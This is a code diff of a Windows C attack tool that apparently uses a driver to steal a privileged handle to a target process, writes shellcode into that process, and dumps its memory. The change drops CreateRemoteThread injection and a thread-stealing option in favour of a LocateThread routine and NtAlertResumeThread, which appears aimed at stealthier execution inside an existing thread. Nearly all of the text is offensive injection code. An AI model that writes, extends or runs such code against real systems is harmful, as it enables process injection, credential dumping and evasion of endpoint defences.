@@ -6,15 +6,22 @@
 */
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
+#include <winternl.h>
+#include <ntstatus.h>
 #include <stdio.h>
 #include <dbghelp.h>
 #include "shellcode.x64.h"
 #include "mlwrfox.h"
 #include "util.h"
 
+extern NTSTATUS NtAlertResumeThread(
+		HANDLE hThread,
+		PULONG SuspendCount
+);
+
 void usage(char ** argv)
 {
-	printf("Usage: %s [-p process] [-o dumpfile] [-t threadid]\n", argv[0]);
+	printf("Usage: %s [-p process] [-o dumpfile]\n", argv[0]);
 	ExitProcess(0);
 };
 
@@ -34,11 +41,6 @@ int main(int argc, char **argv)
 			  --argc;
 			  pname = strdup(argv[1]);
 		          break;
-		  case 't':
-			  ++argv;
-			  --argc;
-			  tid = atoi(argv[1]);
-			  break;
 		  case 'o':
 			  ++argv;
 			  --argc;
@@ -76,17 +78,9 @@ int main(int argc, char **argv)
 			  goto Cleanup;
 		  };
 
-		  if ( AcquireThread(hDriver, &tid, &hThread) )
-		  {
-			  printf("[+] Stole a thread :) !\n");
-			  system("pause");
-		  } else {
-			  printf("[+] could not steal a thread :(\n");
-		  };
-
 		  if ( AcquireHandle(hDriver, &pid, &privHandle) )
 		  {
-			  printf("[+] stole privileged handle %p to %s\n", privHandle, pname);
+			  printf("[+] stole privileged handle %p to %i\n", privHandle, pid);
 
 			  pMemory = VirtualAllocEx(
 				privHandle,
@@ -118,29 +112,13 @@ int main(int argc, char **argv)
 				NULL
 			  );
 
-			  hThread = CreateRemoteThread(
-				privHandle,
-				NULL,
-				0,
-				(LPTHREAD_START_ROUTINE)pMemory,
-				(LPVOID)pStrMem,
-				0,
-				NULL
-			  );
-
-			  printf("[+] injected %i bytes of shellcode into %s\n", sizeof(buf), pname);
-
-			  WaitForSingleObject(hThread, INFINITE);
-
-			  printf("[+] thread stopped successfully, should have a dump @ %s\n",
-					  outpath);
-
+			  LocateThread(hDriver, pid, pMemory, pStrMem);
+Finish:
 			  VirtualFree(pMemory, 0, MEM_RELEASE);
 			  VirtualFree(pStrMem, 0, MEM_RELEASE);
 
 		  } else { 
-			  printf("[ ] failed to steal handle to %s\n",
-					  pname);
+			  printf("[ ] failed to steal handle to %s\n", pname);
 			  goto Cleanup;
 		  };
 	  } else {
@@ -153,6 +131,8 @@ int main(int argc, char **argv)
 Cleanup:
   if ( privHandle != NULL )
 	  CloseHandle(privHandle);
+  if ( hThread != NULL )
+	  CloseHandle(hThread);
 
   return -1;
 };
